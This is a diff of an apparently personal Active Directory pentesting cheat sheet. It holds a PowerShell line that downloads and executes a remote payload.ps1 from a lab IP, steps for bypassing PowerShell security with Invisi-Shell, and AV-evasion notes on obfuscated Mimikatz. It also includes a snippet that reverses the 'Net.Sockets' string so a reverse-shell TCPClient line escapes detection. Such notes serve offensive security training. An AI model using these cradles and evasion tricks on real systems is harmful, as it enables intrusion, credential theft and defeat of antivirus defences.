@@ -7,17 +7,20 @@ Load a script and module (local)
 OR
 Import-Module C:\AD\Tools\PowerView.ps1
 ```
+
 list all the commands u can use in a particular module
 ```
 Get-Command -Module <modulename>
 ```
 
-- Load a script and module (remotely)
+Load a script and module (remotely)
 -     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
 
-- Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
--     RunWithPathAsAdmin.bat  (Admin Privilege)
--     RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
+Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
+```
+RunWithPathAsAdmin.bat  (Admin Privilege)
+RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
+```
 
 Bypassing AV Signatures for PowerShell
 .      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
@@ -29,7 +32,7 @@ Bypassing AV Signatures for PowerShell
 .      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
 example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
 ## Reverse the "Net.Sockets" string on line number 32
-```powershell
+```
 $string = "stekcoS.teN"
 $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
 if ($Reverse)
